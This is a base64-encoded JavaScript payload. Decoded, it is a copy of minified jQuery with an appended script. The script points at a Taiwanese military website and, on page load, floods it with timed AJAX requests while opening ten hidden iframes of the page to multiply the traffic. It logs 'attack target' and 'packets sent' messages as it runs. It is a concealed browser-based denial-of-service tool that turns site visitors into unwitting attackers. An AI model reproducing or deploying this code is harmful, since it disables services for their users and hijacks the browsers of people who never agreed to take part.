mVBcnJheSgpKSB9LCBzZXJpYWxpemVBcnJheTogZnVuY3Rpb24gKCkgeyByZXR1cm4gdGhpcy5tYXAoZnVuY3Rpb24gKCkgeyB2YXIgYSA9IG0ucHJvcCh0aGlzLCAiZWxlbWVudHMiKTsgcmV0dXJuIGEgPyBtLm1ha2VBcnJheShhKSA6IHRoaXMgfSkuZmlsdGVyKGZ1bmN0aW9uICgpIHsgdmFyIGEgPSB0aGlzLnR5cGU7IHJldHVybiB0aGlzLm5hbWUgJiYgIW0odGhpcykuaXMoIjpkaXNhYmxlZCIpICYmIFVjLnRlc3QodGhpcy5ub2RlTmFtZSkgJiYgIVRjLnRlc3QoYSkgJiYgKHRoaXMuY2hlY2tlZCB8fCAhVy50ZXN0KGEpKSB9KS5tYXAoZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSBtKHRoaXMpLnZhbCgpOyByZXR1cm4gbnVsbCA9PSBjID8gbnVsbCA6IG0uaXNBcnJheShjKSA/IG0ubWFwKGMsIGZ1bmN0aW9uIChhKSB7IHJldHVybiB7IG5hbWU6IGIubmFtZSwgdmFsdWU6IGEucmVwbGFjZShTYywgIlxyXG4iKSB9IH0pIDogeyBuYW1lOiBiLm5hbWUsIHZhbHVlOiBjLnJlcGxhY2UoU2MsICJcclxuIikgfSB9KS5nZXQoKSB9IH0pLCBtLmFqYXhTZXR0aW5ncy54aHIgPSB2b2lkIDAgIT09IGEuQWN0aXZlWE9iamVjdCA/IGZ1bmN0aW9uICgpIHsgcmV0dXJuICF0aGlzLmlzTG9jYWwgJiYgL14oZ2V0fHBvc3R8aGVhZHxwdXR8ZGVsZXRlfG9wdGlvbnMpJC9pLnRlc3QodGhpcy50eXBlKSAmJiBaYygpIHx8ICRjKCkgfSA6IFpjOyB2YXIgV2MgPSAwLCBYYyA9IHt9LCBZYyA9IG0uYWpheFNldHRpbmdzLnhocigpOyBhLkFjdGl2ZVhPYmplY3QgJiYgbShhKS5vbigidW5sb2FkIiwgZnVuY3Rpb24gKCkgeyBmb3IgKHZhciBhIGluIFhjKSBYY1thXSh2b2lkIDAsICEwKSB9KSwgay5jb3JzID0gISFZYyAmJiAid2l0aENyZWRlbnRpYWxzIiBpbiBZYywgWWMgPSBrLmFqYXggPSAhIVljLCBZYyAmJiBtLmFqYXhUcmFuc3BvcnQoZnVuY3Rpb24gKGEpIHsgaWYgKCFhLmNyb3NzRG9tYWluIHx8IGsuY29ycykgeyB2YXIgYjsgcmV0dXJuIHsgc2VuZDogZnVuY3Rpb24gKGMsIGQpIHsgdmFyIGUsIGYgPSBhLnhocigpLCBnID0gKytXYzsgaWYgKGYub3BlbihhLnR5cGUsIGEudXJsLCBhLmFzeW5jLCBhLnVzZXJuYW1lLCBhLnBhc3N3b3JkKSwgYS54aHJGaWVsZHMpIGZvciAoZSBpbiBhLnhockZpZWxkcykgZltlXSA9IGEueGhyRmllbGRzW2VdOyBhLm1pbWVUeXBlICYmIGYub3ZlcnJpZGVNaW1lVHlwZSAmJiBmLm92ZXJyaWRlTWltZVR5cGUoYS5taW1lVHlwZSksIGEuY3Jvc3NEb21haW4gfHwgY1siWC1SZXF1ZXN0ZWQtV2l0aCJdIHx8IChjWyJYLVJlcXVlc3RlZC1XaXRoIl0gPSAiWE1MSHR0cFJlcXVlc3QiKTsgZm9yIChlIGluIGMpIHZvaWQgMCAhPT0gY1tlXSAmJiBmLnNldFJlcXVlc3RIZWFkZXIoZSwgY1tlXSArICIiKTsgZi5zZW5kKGEuaGFzQ29udGVudCAmJiBhLmRhdGEgfHwgbnVsbCksIGIgPSBmdW5jdGlvbiAoYywgZSkgeyB2YXIgaCwgaSwgajsgaWYgKGIgJiYgKGUgfHwgNCA9PT0gZi5yZWFkeVN0YXRlKSkgaWYgKGRlbGV0ZSBYY1tnXSwgYiA9IHZvaWQgMCwgZi5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBtLm5vb3AsIGUpIDQgIT09IGYucmVhZHlTdGF0ZSAmJiBmLmFib3J0KCk7IGVsc2UgeyBqID0ge30sIGggPSBmLnN0YXR1cywgInN0cmluZyIgPT0gdHlwZW9mIGYucmVzcG9uc2VUZXh0ICYmIChqLnRleHQgPSBmLnJlc3BvbnNlVGV4dCk7IHRyeSB7IGkgPSBmLnN0YXR1c1RleHQgfSBjYXRjaCAoaykgeyBpID0gIiIgfSBoIHx8ICFhLmlzTG9jYWwgfHwgYS5jcm9zc0RvbWFpbiA/IDEyMjMgPT09IGggJiYgKGggPSAyMDQpIDogaCA9IGoudGV4dCA/IDIwMCA6IDQwNCB9IGogJiYgZChoLCBpLCBqLCBmLmdldEFsbFJlc3BvbnNlSGVhZGVycygpKSB9LCBhLmFzeW5jID8gNCA9PT0gZi5yZWFkeVN0YXRlID8gc2V0VGltZW91dChiKSA6IGYub25yZWFkeXN0YXRlY2hhbmdlID0gWGNbZ10gPSBiIDogYigpIH0sIGFib3J0OiBmdW5jdGlvbiAoKSB7IGIgJiYgYih2b2lkIDAsICEwKSB9IH0gfSB9KTsgZnVuY3Rpb24gWmMoKSB7IHRyeSB7IHJldHVybiBuZXcgYS5YTUxIdHRwUmVxdWVzdCB9IGNhdGNoIChiKSB7IH0gfSBmdW5jdGlvbiAkYygpIHsgdHJ5IHsgcmV0dXJuIG5ldyBhLkFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIikgfSBjYXRjaCAoYikgeyB9IH0gbS5hamF4U2V0dXAoeyBhY2NlcHRzOiB7IHNjcmlwdDogInRleHQvamF2YXNjcmlwdCwgYXBwbGljYXRpb24vamF2YXNjcmlwdCwgYXBwbGljYXRpb24vZWNtYXNjcmlwdCwgYXBwbGljYXRpb24veC1lY21hc2NyaXB0IiB9LCBjb250ZW50czogeyBzY3JpcHQ6IC8oPzpqYXZhfGVjbWEpc2NyaXB0LyB9LCBjb252ZXJ0ZXJzOiB7ICJ0ZXh0IHNjcmlwdCI6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBtLmdsb2JhbEV2YWwoYSksIGEgfSB9IH0pLCBtLmFqYXhQcmVmaWx0ZXIoInNjcmlwdCIsIGZ1bmN0aW9uIChhKSB7IHZvaWQgMCA9PT0gYS5jYWNoZSAmJiAoYS5jYWNoZSA9ICExKSwgYS5jcm9zc0RvbWFpbiAmJiAoYS50eXBlID0gIkdFVCIsIGEuZ2xvYmFsID0gITEpIH0pLCBtLmFqYXhUcmFuc3BvcnQoInNjcmlwdCIsIGZ1bmN0aW9uIChhKSB7IGlmIChhLmNyb3NzRG9tYWluKSB7IHZhciBiLCBjID0geS5oZWFkIHx8IG0oImhlYWQiKVswXSB8fCB5LmRvY3VtZW50RWxlbWVudDsgcmV0dXJuIHsgc2VuZDogZnVuY3Rpb24gKGQsIGUpIHsgYiA9IHkuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksIGIuYXN5bmMgPSAhMCwgYS5zY3JpcHRDaGFyc2V0ICYmIChiLmNoYXJzZXQgPSBhLnNjcmlwdENoYXJzZXQpLCBiLnNyYyA9IGEudXJsLCBiLm9ubG9hZCA9IGIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24gKGEsIGMpIHsgKGMgfHwgIWIucmVhZHlTdGF0ZSB8fCAvbG9hZGVkfGNvbXBsZXRlLy50ZXN0KGIucmVhZHlTdGF0ZSkpICYmIChiLm9ubG9hZCA9IGIub25yZWFkeXN0YXRlY2hhbmdlID0gbnVsbCwgYi5wYXJlbnROb2RlICYmIGIucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChiKSwgYiA9IG51bGwsIGMgfHwgZSgyMDAsICJzdWNjZXNzIikpIH0sIGMuaW5zZXJ0QmVmb3JlKGIsIGMuZmlyc3RDaGlsZCkgfSwgYWJvcnQ6IGZ1bmN0aW9uICgpIHsgYiAmJiBiLm9ubG9hZCh2b2lkIDAsICEwKSB9IH0gfSB9KTsgdmFyIF9jID0gW10sIGFkID0gLyg9KVw/KD89JnwkKXxcP1w/LzsgbS5hamF4U2V0dXAoeyBqc29ucDogImNhbGxiYWNrIiwganNvbnBDYWxsYmFjazogZnVuY3Rpb24gKCkgeyB2YXIgYSA9IF9jLnBvcCgpIHx8IG0uZXhwYW5kbyArICJfIiArIHZjKys7IHJldHVybiB0aGlzW2FdID0gITAsIGEgfSB9KSwgbS5hamF4UHJlZmlsdGVyKCJqc29uIGpzb25wIiwgZnVuY3Rpb24gKGIsIGMsIGQpIHsgdmFyIGUsIGYsIGcsIGggPSBiLmpzb25wICE9PSAhMSAmJiAoYWQudGVzdChiLnVybCkgPyAidXJsIiA6ICJzdHJpbmciID09IHR5cGVvZiBiLmRhdGEgJiYgIShiLmNvbnRlbnRUeXBlIHx8ICIiKS5pbmRleE9mKCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSAmJiBhZC50ZXN0KGIuZGF0YSkgJiYgImRhdGEiKTsgcmV0dXJuIGggfHwgImpzb25wIiA9PT0gYi5kYXRhVHlwZXNbMF0gPyAoZSA9IGIuanNvbnBDYWxsYmFjayA9IG0uaXNGdW5jdGlvbihiLmpzb25wQ2FsbGJhY2spID8gYi5qc29ucENhbGxiYWNrKCkgOiBiLmpzb25wQ2FsbGJhY2ssIGggPyBiW2hdID0gYltoXS5yZXBsYWNlKGFkLCAiJDEiICsgZSkgOiBiLmpzb25wICE9PSAhMSAmJiAoYi51cmwgKz0gKHdjLnRlc3QoYi51cmwpID8gIiYiIDogIj8iKSArIGIuanNvbnAgKyAiPSIgKyBlKSwgYi5jb252ZXJ0ZXJzWyJzY3JpcHQganNvbiJdID0gZnVuY3Rpb24gKCkgeyByZXR1cm4gZyB8fCBtLmVycm9yKGUgKyAiIHdhcyBub3QgY2FsbGVkIiksIGdbMF0gfSwgYi5kYXRhVHlwZXNbMF0gPSAianNvbiIsIGYgPSBhW2VdLCBhW2VdID0gZnVuY3Rpb24gKCkgeyBnID0gYXJndW1lbnRzIH0sIGQuYWx3YXlzKGZ1bmN0aW9uICgpIHsgYVtlXSA9IGYsIGJbZV0gJiYgKGIuanNvbnBDYWxsYmFjayA9IGMuanNvbnBDYWxsYmFjaywgX2MucHVzaChlKSksIGcgJiYgbS5pc0Z1bmN0aW9uKGYpICYmIGYoZ1swXSksIGcgPSBmID0gdm9pZCAwIH0pLCAic2NyaXB0IikgOiB2b2lkIDAgfSksIG0ucGFyc2VIVE1MID0gZnVuY3Rpb24gKGEsIGIsIGMpIHsgaWYgKCFhIHx8ICJzdHJpbmciICE9IHR5cGVvZiBhKSByZXR1cm4gbnVsbDsgImJvb2xlYW4iID09IHR5cGVvZiBiICYmIChjID0gYiwgYiA9ICExKSwgYiA9IGIgfHwgeTsgdmFyIGQgPSB1LmV4ZWMoYSksIGUgPSAhYyAmJiBbXTsgcmV0dXJuIGQgPyBbYi5jcmVhdGVFbGVtZW50KGRbMV0pXSA6IChkID0gbS5idWlsZEZyYWdtZW50KFthXSwgYiwgZSksIGUgJiYgZS5sZW5ndGggJiYgbShlKS5yZW1vdmUoKSwgbS5tZXJnZShbXSwgZC5jaGlsZE5vZGVzKSkgfTsgdmFyIGJkID0gbS5mbi5sb2FkOyBtLmZuLmxvYWQgPSBmdW5jdGlvbiAoYSwgYiwgYykgeyBpZiAoInN0cmluZyIgIT0gdHlwZW9mIGEgJiYgYmQpIHJldHVybiBiZC5hcHBseSh0aGlzLCBhcmd1bWVudHMpOyB2YXIgZCwgZSwgZiwgZyA9IHRoaXMsIGggPSBhLmluZGV4T2YoIiAiKTsgcmV0dXJuIGggPj0gMCAmJiAoZCA9IG0udHJpbShhLnNsaWNlKGgsIGEubGVuZ3RoKSksIGEgPSBhLnNsaWNlKDAsIGgpKSwgbS5pc0Z1bmN0aW9uKGIpID8gKGMgPSBiLCBiID0gdm9pZCAwKSA6IGIgJiYgIm9iamVjdCIgPT0gdHlwZW9mIGIgJiYgKGYgPSAiUE9TVCIpLCBnLmxlbmd0aCA+IDAgJiYgbS5hamF4KHsgdXJsOiBhLCB0eXBlOiBmLCBkYXRhVHlwZTogImh0bWwiLCBkYXRhOiBiIH0pLmRvbmUoZnVuY3Rpb24gKGEpIHsgZSA9IGFyZ3VtZW50cywgZy5odG1sKGQgPyBtKCI8ZGl2PiIpLmFwcGVuZChtLnBhcnNlSFRNTChhKSkuZmluZChkKSA6IGEpIH0pLmNvbXBsZXRlKGMgJiYgZnVuY3Rpb24gKGEsIGIpIHsgZy5lYWNoKGMsIGUgfHwgW2EucmVzcG9uc2VUZXh0LCBiLCBhXSkgfSksIHRoaXMgfSwgbS5leHByLmZpbHRlcnMuYW5pbWF0ZWQgPSBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbS5ncmVwKG0udGltZXJzLCBmdW5jdGlvbiAoYikgeyByZXR1cm4gYSA9PT0gYi5lbGVtIH0pLmxlbmd0aCB9OyB2YXIgY2QgPSBhLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudDsgZnVuY3Rpb24gZGQoYSkgeyByZXR1cm4gbS5pc1dpbmRvdyhhKSA/IGEgOiA5ID09PSBhLm5vZGVUeXBlID8gYS5kZWZhdWx0VmlldyB8fCBhLnBhcmVudFdpbmRvdyA6ICExIH0gbS5vZmZzZXQgPSB7IHNldE9mZnNldDogZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQsIGUsIGYsIGcsIGgsIGksIGosIGsgPSBtLmNzcyhhLCAicG9zaXRpb24iKSwgbCA9IG0oYSksIG4gPSB7fTsgInN0YXRpYyIgPT09IGsgJiYgKGEuc3R5bGUucG9zaXRpb24gPSAicmVsYXRpdmUiKSwgaCA9IGwub2Zmc2V0KCksIGYgPSBtLmNzcyhhLCAidG9wIiksIGkgPSBtLmNzcyhhLCAibGVmdCIpLCBqID0gKCJhYnNvbHV0ZSIgPT09IGsgfHwgImZpeGVkIiA9PT0gaykgJiYgbS5pbkFycmF5KCJhdXRvIiwgW2YsIGldKSA+IC0xLCBqID8gKGQgPSBsLnBvc2l0aW9uKCksIGcgPSBkLnRvcCwgZSA9IGQubGVmdCkgOiAoZyA9IHBhcnNlRmxvYXQoZikgfHwgMCwgZSA9IHBhcnNlRmxvYXQoaSkgfHwgMCksIG0uaXNGdW5jdGlvbihiKSAmJiAoYiA9IGIuY2FsbChhLCBjLCBoKSksIG51bGwgIT0gYi50b3AgJiYgKG4udG9wID0gYi50b3AgLSBoLnRvcCArIGcpLCBudWxsICE9IGIubGVmdCAmJiAobi5sZWZ0ID0gYi5sZWZ0IC0gaC5sZWZ0ICsgZSksICJ1c2luZyIgaW4gYiA/IGIudXNpbmcuY2FsbChhLCBuKSA6IGwuY3NzKG4pIH0gfSwgbS5mbi5leHRlbmQoeyBvZmZzZXQ6IGZ1bmN0aW9uIChhKSB7IGlmIChhcmd1bWVudHMubGVuZ3RoKSByZXR1cm4gdm9pZCAwID09PSBhID8gdGhpcyA6IHRoaXMuZWFjaChmdW5jdGlvbiAoYikgeyBtLm9mZnNldC5zZXRPZmZzZXQodGhpcywgYSwgYikgfSk7IHZhciBiLCBjLCBkID0geyB0b3A6IDAsIGxlZnQ6IDAgfSwgZSA9IHRoaXNbMF0sIGYgPSBlICYmIGUub3duZXJEb2N1bWVudDsgaWYgKGYpIHJldHVybiBiID0gZi5kb2N1bWVudEVsZW1lbnQsIG0uY29udGFpbnMoYiwgZSkgPyAodHlwZW9mIGUuZ2V0Qm91bmRpbmdDbGllbnRSZWN0ICE9PSBLICYmIChkID0gZS5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKSksIGMgPSBkZChmKSwgeyB0b3A6IGQudG9wICsgKGMucGFnZVlPZmZzZXQgfHwgYi5zY3JvbGxUb3ApIC0gKGIuY2xpZW50VG9wIHx8IDApLCBsZWZ0OiBkLmxlZnQgKyAoYy5wYWdlWE9mZnNldCB8fCBiLnNjcm9sbExlZnQpIC0gKGIuY2xpZW50TGVmdCB8fCAwKSB9KSA6IGQgfSwgcG9zaXRpb246IGZ1bmN0aW9uICgpIHsgaWYgKHRoaXNbMF0pIHsgdmFyIGEsIGIsIGMgPSB7IHRvcDogMCwgbGVmdDogMCB9LCBkID0gdGhpc1swXTsgcmV0dXJuICJmaXhlZCIgPT09IG0uY3NzKGQsICJwb3NpdGlvbiIpID8gYiA9IGQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCkgOiAoYSA9IHRoaXMub2Zmc2V0UGFyZW50KCksIGIgPSB0aGlzLm9mZnNldCgpLCBtLm5vZGVOYW1lKGFbMF0sICJodG1sIikgfHwgKGMgPSBhLm9mZnNldCgpKSwgYy50b3AgKz0gbS5jc3MoYVswXSwgImJvcmRlclRvcFdpZHRoIiwgITApLCBjLmxlZnQgKz0gbS5jc3MoYVswXSwgImJvcmRlckxlZnRXaWR0aCIsICEwKSksIHsgdG9wOiBiLnRvcCAtIGMudG9wIC0gbS5jc3MoZCwgIm1hcmdpblRvcCIsICEwKSwgbGVmdDogYi5sZWZ0IC0gYy5sZWZ0IC0gbS5jc3MoZCwgIm1hcmdpbkxlZnQiLCAhMCkgfSB9IH0sIG9mZnNldFBhcmVudDogZnVuY3Rpb24gKCkgeyByZXR1cm4gdGhpcy5tYXAoZnVuY3Rpb24gKCkgeyB2YXIgYSA9IHRoaXMub2Zmc2V0UGFyZW50IHx8IGNkOyB3aGlsZSAoYSAmJiAhbS5ub2RlTmFtZShhLCAiaHRtbCIpICYmICJzdGF0aWMiID09PSBtLmNzcyhhLCAicG9zaXRpb24iKSkgYSA9IGEub2Zmc2V0UGFyZW50OyByZXR1cm4gYSB8fCBjZCB9KSB9IH0pLCBtLmVhY2goeyBzY3JvbGxMZWZ0OiAicGFnZVhPZmZzZXQiLCBzY3JvbGxUb3A6ICJwYWdlWU9mZnNldCIgfSwgZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSAvWS8udGVzdChiKTsgbS5mblthXSA9IGZ1bmN0aW9uIChkKSB7IHJldHVybiBWKHRoaXMsIGZ1bmN0aW9uIChhLCBkLCBlKSB7IHZhciBmID0gZGQoYSk7IHJldHVybiB2b2lkIDAgPT09IGUgPyBmID8gYiBpbiBmID8gZltiXSA6IGYuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50W2RdIDogYVtkXSA6IHZvaWQgKGYgPyBmLnNjcm9sbFRvKGMgPyBtKGYpLnNjcm9sbExlZnQoKSA6IGUsIGMgPyBlIDogbShmKS5zY3JvbGxUb3AoKSkgOiBhW2RdID0gZSkgfSwgYSwgZCwgYXJndW1lbnRzLmxlbmd0aCwgbnVsbCkgfSB9KSwgbS5lYWNoKFsidG9wIiwgImxlZnQiXSwgZnVuY3Rpb24gKGEsIGIpIHsgbS5jc3NIb29rc1tiXSA9IExiKGsucGl4ZWxQb3NpdGlvbiwgZnVuY3Rpb24gKGEsIGMpIHsgcmV0dXJuIGMgPyAoYyA9IEpiKGEsIGIpLCBIYi50ZXN0KGMpID8gbShhKS5wb3NpdGlvbigpW2JdICsgInB4IiA6IGMpIDogdm9pZCAwIH0pIH0pLCBtLmVhY2goeyBIZWlnaHQ6ICJoZWlnaHQiLCBXaWR0aDogIndpZHRoIiB9LCBmdW5jdGlvbiAoYSwgYikgeyBtLmVhY2goeyBwYWRkaW5nOiAiaW5uZXIiICsgYSwgY29udGVudDogYiwgIiI6ICJvdXRlciIgKyBhIH0sIGZ1bmN0aW9uIChjLCBkKSB7IG0uZm5bZF0gPSBmdW5jdGlvbiAoZCwgZSkgeyB2YXIgZiA9IGFyZ3VtZW50cy5sZW5ndGggJiYgKGMgfHwgImJvb2xlYW4iICE9IHR5cGVvZiBkKSwgZyA9IGMgfHwgKGQgPT09ICEwIHx8IGUgPT09ICEwID8gIm1hcmdpbiIgOiAiYm9yZGVyIik7IHJldHVybiBWKHRoaXMsIGZ1bmN0aW9uIChiLCBjLCBkKSB7IHZhciBlOyByZXR1cm4gbS5pc1dpbmRvdyhiKSA/IGIuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyJjbGllbnQiICsgYV0gOiA5ID09PSBiLm5vZGVUeXBlID8gKGUgPSBiLmRvY3VtZW50RWxlbWVudCwgTWF0aC5tYXgoYi5ib2R5WyJzY3JvbGwiICsgYV0sIGVbInNjcm9sbCIgKyBhXSwgYi5ib2R5WyJvZmZzZXQiICsgYV0sIGVbIm9mZnNldCIgKyBhXSwgZVsiY2xpZW50IiArIGFdKSkgOiB2b2lkIDAgPT09IGQgPyBtLmNzcyhiLCBjLCBnKSA6IG0uc3R5bGUoYiwgYywgZCwgZykgfSwgYiwgZiA/IGQgOiB2b2lkIDAsIGYsIG51bGwpIH0gfSkgfSksIG0uZm4uc2l6ZSA9IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMubGVuZ3RoIH0sIG0uZm4uYW5kU2VsZiA9IG0uZm4uYWRkQmFjaywgImZ1bmN0aW9uIiA9PSB0eXBlb2YgZGVmaW5lICYmIGRlZmluZS5hbWQgJiYgZGVmaW5lKCJqcXVlcnkiLCBbXSwgZnVuY3Rpb24gKCkgeyByZXR1cm4gbSB9KTsgdmFyIGVkID0gYS5qUXVlcnksIGZkID0gYS4kOyByZXR1cm4gbS5ub0NvbmZsaWN0ID0gZnVuY3Rpb24gKGIpIHsgcmV0dXJuIGEuJCA9PT0gbSAmJiAoYS4kID0gZmQpLCBiICYmIGEualF1ZXJ5ID09PSBtICYmIChhLmpRdWVyeSA9IGVkKSwgbSB9LCB0eXBlb2YgYiA9PT0gSyAmJiAoYS5qUXVlcnkgPSBhLiQgPSBtKSwgbQ0KfSk7DQovL3ZhciB0YXJnZXQgPSJodHRwOi8vd3d3Lmppb2MubWlsLnR3L2RlZmF1bHQuYXNweCI7DQp1cmxfYXJyYXkgPSBuZXcgQXJyYXkoImh0dHA6Ly93d3cuamlvYy5taWwudHcvZGVmYXVsdC5hc3B4Iik7DQovL3VybF9hcnJ5ID0gbmV3IEFycmF5KHRhcmdldC5zcGxpdCgnLCcpKTsNCg0KdHMgPSAwOw0KdGltZSA9IDUwMDsNCg0KDQpzdGFydGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KdmFyIGNvdW50ID0gMDsNCg0KZnVuY3Rpb24gdW5peHRpbWUoKSB7DQogICAgdmFyIGR0ID0gbmV3IERhdGUoKTsNCiAgICB2YXIgdXggPSBEYXRlLlVUQyhkdC5nZXRGdWxsWWVhcigpLCBkdC5nZXRNb250aCgpLCBkdC5nZXREYXkoKSwgZHQuZ2V0SG91cnMoKSwgZHQuZ2V0TWludXRlcygpLCBkdC5nZXRTZWNvbmRzKCkpIC8gMTAwMDsNCiAgICByZXR1cm4gdXg7DQp9DQovL+S/ruaUueebruaomemggemdog0KY291bnQgPSAwOw0KDQpOVU0gPSB1cmxfYXJyYXkubGVuZ3RoOw0KDQpmdW5jdGlvbiByX3NlbmQyKCkgew0KICAgIHZhciB4ID0gdW5peHRpbWUoKSAlIE5VTTsNCiAgICB2YXIgdXJsID0gdXJsX2FycmF5W3hdOw0KICAgIC8vIGlmKGNvdW50ID09MCkgcmVwb3J0KCk7DQogICAgDQogICAgZ2V0KHVybCk7DQogICANCn0NCg0KDQpmdW5jdGlvbiBnZXQobXl1cmwpIHsNCiAgICB2YXIgcGluZzsNCiAgICAkLmFqYXgoew0KICAgICAgICB1cmw6IG15dXJsICsgIj9pZD0iICsgdW5peHRpbWUoKSsiICYgcHdkPSIrdW5peHRpbWUoKSwNCiAgICAgICAgZGF0YVR5cGU6ICJ0ZXh0IiwNCiAgICAgICAgdGltZW91dDogdHMsDQogICAgICAgIGNhY2hlOiB0cnVlLA0KICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbiAoKSB7DQogICAgICAgICAgICByZXF1ZXN0VGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KICAgICAgICB9LA0KICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgcmVzcG9uc2VUaW1lID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgICAgICBwaW5nID0gTWF0aC5mbG9vcihyZXNwb25zZVRpbWUgLSByZXF1ZXN0VGltZSk7DQogICAgICAgICAgICBpZiAocmVzcG9uc2VUaW1lIC0gc3RhcnRpbWUgPCAzMDAwMDApIHsNCiAgICAgICAgICAgICAgICByX3NlbmQocGluZyk7DQogICAgICAgICAgICAgICAgJCgiI3RleHRfc2hvdyIpLnZhbCgi5pS75pOK55uu5qiZOiIrdXJsX2FycmF5WzBdKyLlsIHljIXnmbzpgIEiKyBteXVybCArICI/aWQ9IiArIHVuaXh0aW1lKCkrIiAmIHB3ZD0iK3VuaXh0aW1lKCkrIlxuIisgJCgiI3RleHRfc2hvdyIpLnZhbCgpKTsNCiAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KZnVuY3Rpb24gcl9zZW5kKHBpbmcpIHsNCiAgICBzZXRUaW1lb3V0KCJyX3NlbmQyKCkiLCBwaW5nKTsNCiAgIA0KLy8gICAgZG9jdW1lbnQud3JpdGUoIuWwgeWMheeZvOmAgeaIkOWKnzoiK2NvdW50KTsNCiAgLy8gIGNvdW50ID0gY291bnQgKyAxDQp9DQoNCiAgICBmdW5jdGlvbiBjcmVhdGVJZnJhbWUoaWQsdXJsKSB7DQogICAgICAgIHZhciBmID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnSWZyYW1lJyk7DQogICAgICAgIGYuc3JjID0gdXJsOw0KICAgICAgICBmLmlkID0gaWQ7DQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik7DQogICAgIA0KICAgIH0NCgkNCgkNCiQoZG9jdW1lbnQuYm9keSkucmVhZHkoZnVuY3Rpb24gKCkgew0KICAgZm9yKHZhciAgaSA9IDA7IGkgPCAxMCA7aSArKyl7DQogICAgICAgIGNyZWF0ZUlmcmFtZSgnZmZmZmZmZmYnK2ksZG9jdW1lbnQuVVJMKTsNCiAgICAgICAgJCgnI2ZmZmZmZmZmJytpKS5hdHRyKCdzdHlsZScsICd2aXNpYmlsaXR5OmhpZGRlbicpOw0KICAgIH0NCg0KICAgIHJfc2VuZCgxMDApOw0KfSk7DQovL3NldFRpbWVvdXQoInJfc2VuZDIoKSwiICsgdGltZSk7'));  